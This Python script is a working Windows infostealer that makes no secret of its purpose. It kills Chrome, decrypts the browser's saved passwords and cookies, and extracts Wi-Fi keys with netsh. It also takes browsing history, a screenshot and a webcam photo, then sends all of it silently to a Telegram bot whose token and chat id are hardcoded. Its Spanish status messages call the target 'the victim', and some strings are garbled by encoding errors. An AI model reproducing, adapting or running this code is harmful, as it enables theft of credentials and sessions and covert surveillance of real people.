import subprocess
import sys
import importlib
import requests
import platform
import socket
import json
import os
import telebot
import sqlite3
import shutil
import time
import psutil
import wmi
from datetime import datetime, timedelta
from PIL import ImageGrab
import cv2
import zipfile
import win32crypt
import base64

# Auto-install with user perms and retry
def install_package(package):
    try:
        importlib.import_module(package)
        return True  # Already installed, no sweat
    except ImportError:
        for attempt in range(2):  # Retry once if it flops
            try:
                subprocess.check_call([sys.executable,"-m","pip","install", package,"--user"])
                importlib.import_module(package)  # Double-check it loaded
                return True
            except subprocess.CalledProcessError as e:
                print(f"Install attempt {attempt + 1} fucked up: {str(e)}")
                time.sleep(1)  # Chill a sec before retry
            except ImportError:
                print(f"Installed {package} but still canâ€™t load it, what the fuck?")
        return False

# Required packages
required_packages = ["requests","telebot","psutil","pillow","opencv-python","pywin32","wmi"]
for pkg in required_packages:
    if not install_package(pkg):
        print(f"Couldnâ€™t install {pkg}, shit might break later.")

# Telegram setup
bot_token = '7814901359:AAHmh4lpUMMwGYJeqz-qF2hJDTMYLSWKU3U'  # Replace with yours
chat_id = '7972070393'  # Replace with yours
bot = telebot.TeleBot(bot_token)

# Admin check and escalation
def is_admin():
    try:
        return os.getuid() == 0
    except AttributeError:
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0

def run_as_admin():
    if not is_admin():
        try:
            subprocess.call(['runas', '/user:Administrator', f'"{sys.executable}" "{os.path.abspath(__file__)}"'])
            sys.exit()
        except:
            bot.send_message(chat_id,"Couldnâ€™t escalate to admin, might miss some juicy shit.", disable_notification=True)

# Kill Chrome
def kill_chrome():
    try:
        subprocess.run('taskkill /IM chrome.exe /F', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(2)
    except:
        pass

# Chrome paths
def get_chrome_cookies_path():
    username = os.environ['USERNAME']
    base_path = f"C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network"
    cookie_path = os.path.join(base_path,"Cookies")
    return cookie_path if os.path.exists(cookie_path) else None

def get_chrome_passwords_path():
    username = os.environ['USERNAME']
    base_path = f"C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default"
    password_path = os.path.join(base_path,"Login Data")
    return password_path if os.path.exists(password_path) else None

# Get Chrome cookies
def get_all_chrome_cookies():
    try:
        kill_chrome()
        cookie_path = get_chrome_cookies_path()
        if not cookie_path:
            return"No cookies file, Chrome installed?"
        temp_path ="Cookies_temp.db"
        shutil.copy2(cookie_path, temp_path)
        conn = sqlite3.connect(temp_path)
        conn.text_factory = bytes
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
        cookies = []
        for row in cursor.fetchall():
            host, name, encrypted_value = row
            try:
                decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8')
            except:
                decrypted_value ="[Unreadable]"
            cookies.append({"Domain": host.decode('utf-8'),"Name": name.decode('utf-8'),"Value": decrypted_value})
        conn.close()
        with open("cookies.json","w", encoding='utf-8') as f:
            json.dump(cookies, f, indent=2, ensure_ascii=False)
        with zipfile.ZipFile("cookies.zip","w", zipfile.ZIP_DEFLATED) as zipf:
            zipf.write("cookies.json")
        os.remove(temp_path)
        os.remove("cookies.json")
        return"cookies.zip"
    except Exception as e:
        return f"Cookie grab fucked up: {str(e)}"

# Get Chrome passwords
def get_chrome_passwords():
    try:
        kill_chrome()
        password_path = get_chrome_passwords_path()
        if not password_path:
            return"No passwords file, Chrome installed?"
        temp_path ="LoginData_temp.db"
        shutil.copy2(password_path, temp_path)
        conn = sqlite3.connect(temp_path)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        passwords = []
        for row in cursor.fetchall():
            url, username, encrypted_pass = row
            try:
                decrypted_pass = win32crypt.CryptUnprotectData(encrypted_pass, None, None, None, 0)[1].decode('utf-8')
            except:
                decrypted_pass ="[Unreadable]"
            passwords.append({"URL": url,"User": username,"Password": decrypted_pass})
        conn.close()
        if not passwords:
            return"No passwords in Chrome, shitâ€™s empty!"
        with open("passwords.json","w", encoding='utf-8') as f:
            json.dump(passwords, f, indent=2)
        with zipfile.ZipFile("passwords.zip","w", zipfile.ZIP_DEFLATED) as zipf:
            zipf.write("passwords.json")
        os.remove(temp_path)
        os.remove("passwords.json")
        return"passwords.zip"
    except Exception as e:
        return f"Password grab fucked up: {str(e)}"

# Get Wi-Fi passwords
def get_wifi_passwords():
    try:
        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="ignore").split('\n')
        profiles = [line.split(":")[1].strip() for line in data if"All User Profile" in line]
        wifi_list = []
        for profile in profiles:
            try:
                results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']).decode('utf-8', errors="ignore").split('\n')
                password = [line.split(":")[1].strip() for line in results if"Key Content" in line]
                wifi_list.append({"Network": profile,"Password": password[0] if password else"No Password"})
            except:
                wifi_list.append({"Network": profile,"Password":"[Couldnâ€™t grab]"})
        with open("wifi.json","w", encoding='utf-8') as f:
            json.dump(wifi_list, f, indent=2)
        with zipfile.ZipFile("wifi.zip","w", zipfile.ZIP_DEFLATED) as zipf:
            zipf.write("wifi.json")
        os.remove("wifi.json")
        return"wifi.zip"
    except Exception as e:
        return f"Wi-Fi grab fucked up: {str(e)}"

# Get browser history
def get_browser_history():
    try:
        kill_chrome()
        username = os.environ['USERNAME']
        history_path = f"C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
        if not os.path.exists(history_path):
            return"No history file, Chrome installed?"
        temp_path ="History_temp.db"
        shutil.copy2(history_path, temp_path)
        conn = sqlite3.connect(temp_path)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls")
        history = []
        for row in cursor.fetchall():
            url, title, count, last_visit = row
            try:
                last_visit_time = datetime(1601, 1, 1) + timedelta(microseconds=last_visit)
                history.append({"URL": url,"Title": title,"Visits": count,"Last Visit": str(last_visit_time)})
            except:
                history.append({"URL": url,"Title": title,"Visits": count,"Last Visit":"[Bad Date]"})
        conn.close()
        if not history:
            return"Historyâ€™s empty as fuck!"
        with open("history.json","w", encoding='utf-8') as f:
            json.dump(history, f, indent=2)
        with zipfile.ZipFile("history.zip","w", zipfile.ZIP_DEFLATED) as zipf:
            zipf.write("history.json")
        os.remove(temp_path)
        os.remove("history.json")
        return"history.zip"
    except Exception as e:
        return f"History grab fucked up: {str(e)}"

# Take screenshot
def take_screenshot():
    try:
        screenshot = ImageGrab.grab()
        screenshot_path ="screenshot.png"
        screenshot.save(screenshot_path, quality=50)
        return screenshot_path
    except:
        return None

# Take webcam photo
def take_webcam_photo():
    try:
        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        if not cap.isOpened():
            return None
        ret, frame = cap.read()
        if ret:
            photo_path ="webcam_shot.png"
            cv2.imwrite(photo_path, frame, [cv2.IMWRITE_PNG_COMPRESSION, 9])
            cap.release()
            return photo_path
        cap.release()
        return None
    except:
        return None

# Get system info
def get_system_info():
    try:
        c = wmi.WMI()
        macs = [interface.MACAddress for interface in c.Win32_NetworkAdapterConfiguration(IPEnabled=True)]
        gpus = [gpu.Name for gpu in c.Win32_VideoController()]
        ips = [addr for addr in socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET)]
        ip_list = list(set([ip[4][0] for ip in ips if ip[4][0] != '127.0.0.1']))
        info = ("ğŸ’» ğˆğğ…ğğ‘ğŒğ€ğ‚ğˆğğ ğƒğ„ğ‹ ğ„ğğ”ğˆğğ ğƒğ„ ğ‹ğ€ ğ•ğˆğ‚ğ“ğˆğŒğ€ ğŸŒ\n"
                f"ğŸ‘¤ ğ”ğ’ğ”ğ€ğ‘ğˆğ ğƒğ„ğ“ğ„ğ‚ğ“ğ€ğƒğ : {os.environ['USERNAME']}\n"
                f"ğŸ–¥ï¸ ğ’ğˆğ’ğ“ğ„ğŒğ€ ğğğ„ğ‘ğ€ğ“ğˆğ•ğ ğƒğ„ğ“ğ„ğ‚ğ“ğ€ğƒğ : {platform.system()} {platform.release()}\n"
                f"âš™ï¸ ğ‚ğğ” ğƒğ„ğ“ğ„ğ‚ğ“ğ€ğƒğ : {platform.processor()}\n"
                f"ğŸ® ğ†ğğ” ğƒğ„ğ“ğ„ğ‚ğ“ğ€ğƒğ€ : {' | '.join(gpus)}\n"
                f"ğŸ§  ğ“ğğ“ğ€ğ‹ ğ‘ğ€ğŒ ğƒğ„ğ“ğ„ğ‚ğ“ğ€ğƒğ€ : {round(psutil.virtual_memory().total / (1024**3), 2)} GB\n"
                f"ğŸ’¾ ğ‘ğ€ğŒ ğ‹ğˆğğ‘ğ„ ğƒğ„ ğŒğğŒğ„ğğ“ğ ğƒğ„ğ“ğ„ğ‚ğ“ğ€ğƒğ€ : {round(psutil.virtual_memory().available / (1024**3), 2)} ğ†ğ\n"
                f"ğŸ’½ ğƒğˆğ’ğ‚ğ (ğ‚:) ğ”ğ’ğ€ğƒğ : {round(psutil.disk_usage('/').used / (1024**3), 2)} ğ†ğ ğ‹ğˆğğ‘ğ„ğ’ ğ„ğ ğƒğˆğ’ğ‚ğ (ğ‚:) {round(psutil.disk_usage('/').free / (1024**3), 2)} ğ†ğ\n"
                f"ğŸŒ ğŒğ€ğ‚ ğƒğ„ğ“ğ„ğ‚ğ“ğ€ğƒğ€ : {' | '.join(macs)}\n"
                f"ğŸ“¶ ğˆğ ğƒğ„ğ“ğ„ğ‚ğ“ğ€ğƒğ€ : {' | '.join(ip_list)}")
        return info
    except Exception as e:
        return f"System info fucked up: {str(e)}"

# Send everything to Telegram
def send_to_telegram():
    bot.send_message(chat_id,"âœ… ğˆğğˆğ‚ğˆğ€ğğƒğ ğ„ğ‹ ğğ‘ğğ‚ğ„ğ’ğ ğƒğ„ ğ‘ğ„ğ•ğ„ğğ“ğ€ğ‘ ğ€ ğ‹ğ€ ğ•Ãğ‚ğ“ğˆğŒğ€ ğŸ‘¾ ", disable_notification=True)
    run_as_admin()



    bot.send_message(chat_id,"âœ… ğ„ğ—ğ“ğ‘ğ€ğˆğƒğ: ğˆğğ…ğğ‘ğŒğ€ğ‚ğˆğğ ğ‚ğ‹ğ€ğ•ğ„ ğ‚ğ‡ğ‘ğğŒğ„ ğ€ ğğ”ğğ“ğ ğƒğ„ ğ‚ğ€ğ„ğ‘ğŸ•µï¸", disable_notification=True)
    passwords_file = get_chrome_passwords()

    bot.send_message(chat_id,"âœ… ğ’ğˆğ’ğ“ğ„ğŒğ€ ğƒğ„ğ’ğ„ğğ‚ğ‘ğˆğğ“ğ€ğƒğ ğ„ğ’ğ“ğ„ ğ„ğğ”ğˆğğ ğ˜ğ€ ğ„ğ’ ğŒÃğ ğŸ¥·ğŸ½âš¡ï¸", disable_notification=True)
    system = get_system_info()

    message = f"â˜ ï¸ğˆğğ…ğğ‘ğŒğ€ğ‚ğˆğğ ğƒğ„ ğ’ğ” ğ„ğğ”ğˆğğ ğ‚ğğŒğğ‹ğ„ğ“ğ ğƒğ„ ğ„ğ‹ ğ‚ğ€ğğ‘ğğ ğ„ğ ğğ‘ğğ‚ğ„ğ’ğ ğƒğ„ ğ„ğğ•ğˆğâ˜ ï¸\n\n{system}"
    bot.send_message(chat_id, message, disable_notification=True)

    bot.send_message(chat_id,"âœ… ğ‘ğğğ€ğğƒğ ğ‹ğ€ğ’ ğ‚ğğğŠğˆğ„ğ’ ğ‚ğğŒğ ğ”ğ ğ…ğ€ğğ“ğ€ğ’ğŒğ€ ğ„ğ ğ‹ğ€ ğğˆğ„ğğ‹ğ€ ğŸ’€", disable_notification=True)
    cookies_file = get_all_chrome_cookies()

    if isinstance(cookies_file, str) and cookies_file.endswith(".zip"):
        with open(cookies_file, 'rb') as file:
            bot.send_document(chat_id, file, caption="ğ‚ğğğŠğˆğ„ğ’ ğƒğ„ ğ‹ğ€ ğ•ğˆğ‚ğ“ğˆğŒğ€ ğ‹ğˆğ’ğ“ğ€ ğŸ’»", disable_notification=True)
        os.remove(cookies_file)
    else:
        bot.send_message(chat_id, f"âŒ ğ„ğ‘ğ‘ğğ‘ ğ‚ğğ ğ‹ğ€ğ’ ğ‚ğğğŠğˆğ„ğ’ ğğ ğƒğ„ğ’ğ„ğğ‚ğ‘ğˆğğ“ğ€ğƒğ€ ğŸ˜¢ğŸ’» {cookies_file}", disable_notification=True)

    bot.send_message(chat_id,"âœ… ğğğ“ğ„ğğˆğ„ğğƒğ ğ‹ğ€ ğ‚ğ‹ğ€ğ•ğ„ ğŸ“¶ğŸŒ", disable_notification=True)
    wifi_file = get_wifi_passwords()

    if isinstance(passwords_file, str) and passwords_file.endswith(".zip"):
        with open(passwords_file, 'rb') as file:
            bot.send_document(chat_id, file, caption="âœ… ğ‚ğğğ“ğ‘ğ€ğ’ğ„ğğ€ğ’ ğ„ğ ğ™ğˆğ ğƒğˆğ’ğ…ğ‘ğ”ğ“ğ€ ğŸ’»", disable_notification=True)
        os.remove(passwords_file)
    else:
        bot.send_message(chat_id, f"âŒ ğ„ğ‘ğ‘ğğ‘ ğƒğ„ ğ‚ğğğ“ğ‘ğ€ğ’ğ„Ã‘ğ€ ğğ ğ‡ğ€ğ˜ ğ‚ğğğ“ğ‘ğ€ğ’ğ„ğğ€ğ’ ğ„ğ ğ‚ğ‡ğ‘ğğŒğ„ ğ‹ğ€ ğŒğˆğ„ğ‘ğƒğ€ ğ„ğ’ğ“ğ€ ğ•ğ€ğ‚ğˆğ€: {passwords_file}", disable_notification=True)

    bot.send_message(chat_id,"âœ… ğğğ“ğ„ğğˆğ„ğğƒğ ğ‹ğ€ ğ‚ğ‹ğ€ğ•ğ„ ğ–ğˆğ…ğˆ ğŸ“¶ğŸŒ", disable_notification=True)
    wifi_file = get_wifi_passwords()


    if isinstance(wifi_file, str) and wifi_file.endswith(".zip"):
        with open(wifi_file, 'rb') as file:
            bot.send_document(chat_id, file, caption="âœ… ğ‚ğ‹ğ€ğ•ğ„ğ’ ğ–ğˆğ…ğˆ ğƒğ„ ğ‹ğ€ ğ•ğˆğ‚ğ“ğˆğŒğ€ ğğğ“ğ„ğğˆğƒğ€ ğ„ğ ğ™ğˆğ ğ€ ğ‚ğğğ„ğ‚ğ“ğ€ğ‘ ğŸ’»", disable_notification=True)
        os.remove(wifi_file)
    else:
        bot.send_message(chat_id, f"âŒ ğ„ğ‘ğ‘ğğ‘ ğ‚ğğ ğ‹ğ€ğ’ ğ‚ğ‹ğ€ğ•ğ„ğ’ ğ–ğˆğ…ğˆ ğğ ğ„ğğ‚ğğğ“ğ‘ğ€ğƒğ€ ğ˜ ğğ ğƒğ„ğ’ğ„ğğ‚ğ‘ğˆğğ“ğ€ğƒğ€ ğŸ’»{wifi_file}", disable_notification=True)

    bot.send_message(chat_id,"âœ… ğ‡ğˆğ’ğ“ğğ‘ğˆğ€ğ‹ ğ„ğ ğŒğˆğ’ ğŒğ€ğğğ’ ğ•ğ€ğŒğğ’ ğ€ ğ•ğ„ğ‘ ğğ”ğ„ ğŒğˆğ„ğ‘ğƒğ€ ğ‡ğ€ ğ„ğ’ğ“ğ€ğƒğ ğŒğˆğ‘ğ€ğğƒğ ğŸ•¸ï¸", disable_notification=True)
    history_file = get_browser_history()

    if isinstance(history_file, str) and history_file.endswith(".zip"):
        with open(history_file, 'rb') as file:
            bot.send_document(chat_id, file, caption="âœ… ğ‡ğˆğ’ğ“ğğ‘ğˆğ€ğ‹ ğƒğ„ ğğ€ğ•ğ„ğ†ğ€ğ‚ğˆğğ ğ„ğğ‚ğğğ“ğ‘ğ€ğƒğ ğƒğ„ ğ‹ğ€ ğ•ğˆğ‚ğ“ğˆğŒğ€ ğ„ğ .ğ™ğˆğğŸ’»", disable_notification=True)
        os.remove(history_file)
    else:
        bot.send_message(chat_id, f"âŒ ğ„ğ‘ğ‘ğğ‘ ğ‚ğğ ğ„ğ‹ ğ‡ğˆğ’ğ“ğğ‘ğˆğ€ğ‹ ğğ ğ„ğğ‚ğğğ“ğ‘ğ€ğƒğ ğŸ’» {history_file}", disable_notification=True)



    bot.send_message(chat_id,"âœ… ğ‚ğ€ğğ“ğ”ğ‘ğ€ ğğğ“ğ„ğğˆğƒğ€ ğˆğğ…ğğ‘ğŒğ€ğ‚ğˆğğ ğƒğ„ğ‹ ğ„ğ’ğ‚ğ‘ğˆğ“ğğ‘ğˆğ ğƒğ„ ğ„ğ’ğ“ğ„ ğ‹ğ€ ğ•ğˆğ‚ğ“ğˆğŒğ€ ğŸ“¸", disable_notification=True)
    screenshot = take_screenshot()

    if screenshot and os.path.exists(screenshot):
        with open(screenshot, 'rb') as photo:
            bot.send_photo(chat_id, photo, disable_notification=True)
        os.remove(screenshot)


    bot.send_message(chat_id,"âœ… ğ–ğ„ğğ‚ğ€ğŒ ğ„ğğ‚ğ„ğğƒğˆğƒğ€ ğ’ğğğ‘ğˆğ„ ğğ€ ğ‹ğ€ ğ…ğğ“ğ ğ‚ğ€ğğ‘ğğ ğŸ˜", disable_notification=True)
    webcam = take_webcam_photo()


    if webcam and os.path.exists(webcam):
        with open(webcam, 'rb') as photo:
            bot.send_photo(chat_id, photo, disable_notification=True)
        os.remove(webcam)

    bot.send_message(chat_id,"ğŸ‘½ ğˆğğ…ğğ‘ğŒğ€ğ‚ğˆğğ ğğğ“ğ„ğğˆğƒğ€ ğ‚ğğ‘ğ‘ğ„ğ‚ğ“ğ€ğŒğ„ğğ“ğ„ ğ“ğğƒğ ğ€ğ‹ ğŸğŸğŸ% ğŸ‘½", disable_notification=True)

if __name__ == "__main__":
    subprocess.Popen.send_signal = lambda*args: None
    try:
        send_to_telegram()
    except Exception as e:
        bot.send_message(chat_id, f"âŒ ğ€ğ‹ğ†ğ ğ’ğ„ ğ‰ğğƒğˆğ ğ„ğ‹ ğğ”ğ“ğ ğ€ğğ“ğˆğ•ğˆğ‘ğ”ğ’ ğğğ’ ğƒğ„ğ“ğ„ğ‚ğ“ğ ğŸ’€ğŸ’» {str(e)}", disable_notification=True)